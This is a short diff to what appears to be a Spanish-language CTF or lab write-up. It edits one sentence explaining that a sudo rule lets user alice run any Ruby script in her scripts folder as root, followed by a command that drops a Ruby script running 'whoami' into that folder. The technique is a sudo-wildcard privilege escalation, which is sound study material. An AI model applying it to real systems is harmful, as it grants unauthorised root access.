@@ -221,7 +221,7 @@ User alice may run the following commands on 5ce75c1fe1d2:
     (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
 
 
-puedo ejecutar cualquier script en ruby como sudo, por lo que creare un script que ejecute comandos del sistema
+puedo ejecutar cualquier script en ruby como root, por lo que creare un script que ejecute comandos del sistema
 
 echo 'exec "whoami"' > /home/alice/scripts/darksblack.rb && chmod +x /home/alice/scripts/darksblack.rb
 
